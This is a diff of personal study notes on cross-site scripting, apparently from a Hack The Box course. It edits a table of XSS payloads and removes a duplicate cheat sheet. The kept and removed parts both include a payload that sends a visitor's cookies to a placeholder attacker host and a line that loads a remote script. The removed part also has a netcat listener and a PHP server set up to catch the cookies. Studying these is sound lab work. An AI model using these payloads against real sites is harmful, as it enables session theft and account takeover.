@@ -22,7 +22,7 @@ XSS vulnerabilities take advantage of a flaw in user input sanitization to "writ
 | Basic XSS Payload | `<marquee>` |
 | Basic XSS Payload | `<script>alert(window.origin)</script>` |
 | Basic XSS Payload | `<script>alert(1)</script>` |
-| Basic XSS Payload | `<plaintext>` |
+| Basic XSS Payload that stops rendering the HTML code that comes after it and display it as plaintext.  | `<plaintext>` |
 | Basic XSS Payload | `<script>print()</script>` |
 | HTML-based XSS Payload | `<img src="" onerror=alert(window.origin)>` |
 | Change Background Color | `<script>document.body.style.background = "#141d2b"</script>` |
@@ -32,6 +32,10 @@ XSS vulnerabilities take advantage of a flaw in user input sanitization to "writ
 | Remove certain HTML element | `<script>document.getElementById('urlform').remove();</script>` |
 | Load remote script | `<script src="http://OUR_IP/script.js"></script>` |
 | Send Cookie details to us | `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` |
+
+# HTB Module questions
+## Cross-Site Scripting (XSS)
+## Advanced XSS and CSRF Exploitation
 
 # Notes
 ## Same-Origin Policy (SOP) 
@@ -102,36 +106,9 @@ Execution Sinks:
 - constructor: `[].constructor.constructor(alert(1))()`
 
 ---
-# HTB Module questions
-## Cross-Site Scripting (XSS)
+
 
 
 ---
-
-# HTB Cheat Sheet
-## XSS Payloads
-| Code | Description |
-|------|-------------|
-| CHeck for filt
-| `<marquee>` | Basic XSS Payload |
-| `<script>alert(window.origin)</script>` | Basic XSS Payload |
-| `<plaintext>` | Basic XSS Payload |
-| `<script>print()</script>` | Basic XSS Payload |
-| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |
-| `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
-| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
-| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
-| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body |
-| `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element |
-| `<script src="http://OUR_IP/script.js"></script>` | Load remote script |
-| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send Cookie details to us |
-
-## Commands
-
-| Code | Description |
-|------|-------------|
-| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run `xsstrike` on a url parameter |
-| `sudo nc -lvnp 80` | Start `netcat` listener |
-| `sudo php -S 0.0.0.0:80` | Start `PHP` server |
 
 
